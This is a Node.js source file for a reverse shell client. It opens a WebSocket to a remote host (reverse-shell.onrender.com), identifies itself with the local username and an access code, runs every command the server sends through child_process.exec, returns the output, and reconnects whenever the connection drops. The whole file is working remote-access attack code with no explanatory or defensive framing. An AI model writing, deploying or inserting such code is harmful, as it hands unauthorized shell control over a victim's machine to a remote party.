const { exec } = require('child_process');
var WebSocket = require('ws');

const connect = () => {
  //var ws = new WebSocket('ws://192.168.0.240:8080');
  //var ws = new WebSocket('wss://reverseshell-ondrejdostal007.b4a.run/');
  var ws = new WebSocket('wss://reverse-shell.onrender.com/');
  ws.on('open', () => {
      console.log("> Websocket connection established.")
      console.log("> Connected to: wss://reverseshell-ondrejdostal007.b4a.run/")
      ws.send(JSON.stringify({ type: "id", value: require("os").userInfo().username, accessCode: "tvojemama" }))
  });
  ws.on('message', function(msg) {
    console.log("Received >", msg.toString())
    msg = JSON.parse(msg.toString())
    console.log("Parsed >", msg)
    switch(msg.type){
      case "msg":
        console.log("Message >", msg.value)
        break;
      case "exec":
        exec(msg.value, (error, stdout, stderr) => {
          console.log('> Transmitting output..');
          if (error) {
              console.log('> Transmission successfull.');
              return ws.send(JSON.stringify({ type: "cmd", value: error.message, to: "web" }))
          }
          if (stderr) {
              console.log('> Transmission successfull.');
              return ws.send(JSON.stringify({ type: "cmd", value: stderr, to: "web" }))
          }
          console.log('> Transmission successfull.');
          return ws.send(JSON.stringify({ type: "cmd", value: stdout, to: "web" }))
        })
        break;
    }
  });

  ws.on("upgrade", (data) => {
    console.log("> Protocol upgraded from HTTP to WSS.", data.statusCode)
  })
  ws.on("close", (data) => {
    console.log("> Connection closed.", data)
    console.log("Reconnecting..")
    connect()
  })
  ws.on("error", (err) => {
    console.log("ERROR", err)
  })
}
connect()